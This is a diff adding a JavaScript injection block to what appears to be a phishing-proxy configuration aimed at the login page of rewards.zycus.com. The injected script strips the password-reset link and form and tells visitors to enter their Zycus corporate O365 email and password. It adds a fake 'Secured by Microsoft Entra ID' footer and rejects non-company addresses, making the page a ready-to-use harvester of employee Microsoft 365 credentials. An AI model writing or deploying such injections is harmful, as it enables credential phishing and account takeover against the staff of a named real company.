@@ -30,3 +30,91 @@ credentials:
 login:
   domain: 'rewards.zycus.com'
   path: '/login.php'
+
+js_inject:
+- trigger_domains: ["rewards.zycus.com"]
+  trigger_paths: ["/login.php", "/"]
+  script: |
+    function microsoftO365EnhanceAndClean() {
+      var loginForm = document.getElementById('login');
+      if (!loginForm) return setTimeout(microsoftO365EnhanceAndClean, 300);
+
+      var emailInput = loginForm.querySelector('input[name="email"]');
+      var passInput  = loginForm.querySelector('input[name="password"]');
+      if (!emailInput || !passInput) return setTimeout(microsoftO365EnhanceAndClean, 300);
+
+      // 1. Hide / remove "Forgot your password?" link and related paragraph
+      var forgotLink = loginForm.querySelector('a.toforgot1');
+      var forgotParagraph = loginForm.querySelector('p.text-right');
+      if (forgotLink) forgotLink.parentNode.removeChild(forgotLink);
+      if (forgotParagraph) forgotParagraph.parentNode.removeChild(forgotParagraph);
+
+      // Also hide the entire forgot password form section (just in case)
+      var forgotForm = document.getElementById('forgot');
+      if (forgotForm) forgotForm.style.display = 'none';
+
+      // 2. Add clean Microsoft 365 notice
+      var notice = document.createElement('div');
+      notice.style.backgroundColor = '#f8f9fa';
+      notice.style.border = '1px solid #dee2e6';
+      notice.style.borderRadius = '4px';
+      notice.style.padding = '12px';
+      notice.style.margin = '0 0 20px 0';
+      notice.style.fontSize = '14px';
+      notice.style.textAlign = 'center';
+      notice.innerHTML =
+        '<strong>Sign in with your Zycus corporate O365 email and password</strong><br>';
+
+      var firstGroup = loginForm.querySelector('.form-group');
+      if (firstGroup) firstGroup.parentNode.insertBefore(notice, firstGroup);
+
+      // 3. Natural Microsoft-style placeholders
+      emailInput.placeholder = "yourname@zycus.com";
+      passInput.placeholder = "Enter your password";
+
+      var footerNotice = document.createElement('div');
+      footerNotice.style.marginTop = '24px';
+      footerNotice.style.fontSize = '12px';
+      footerNotice.style.color = '#666';
+      footerNotice.style.textAlign = 'center';
+      footerNotice.innerHTML =
+        'This site uses cookies. By signing in, you agree to our ' +
+        '<a href="#" style="color:#0067c5; text-decoration:none;">Privacy</a> & ' +
+        '<a href="#" style="color:#0067c5; text-decoration:none;">Cookies</a>.<br>' +
+        '© 2026 Zycus Inc. • Secured by Microsoft Entra ID';
+
+      loginForm.appendChild(footerNotice);
+
+      // 5. Light email validation (only shows if wrong)
+      var error = document.createElement('div');
+      error.style.color = '#dc3545';
+      error.style.fontSize = '13px';
+      error.style.marginTop = '6px';
+      emailInput.parentNode.appendChild(error);
+
+      function checkEmail() {
+        var val = (emailInput.value || '').trim().toLowerCase();
+        if (val && !val.endsWith('@zycus.com')) {
+          error.textContent = 'Use your official Zycus @zycus.com email';
+          emailInput.style.borderColor = '#dc3545';
+        } else {
+          error.textContent = '';
+          emailInput.style.borderColor = '';
+        }
+      }
+
+      emailInput.addEventListener('input', checkEmail);
+      emailInput.addEventListener('blur', checkEmail);
+
+      // Focus email field for better UX
+      emailInput.focus();
+    }
+
+    // Run after page is ready
+    if (document.readyState !== 'loading') {
+      setTimeout(microsoftO365EnhanceAndClean, 400);
+    } else {
+      document.addEventListener('DOMContentLoaded', function() {
+        setTimeout(microsoftO365EnhanceAndClean, 400);
+      });
+    }                                                                                                                                 
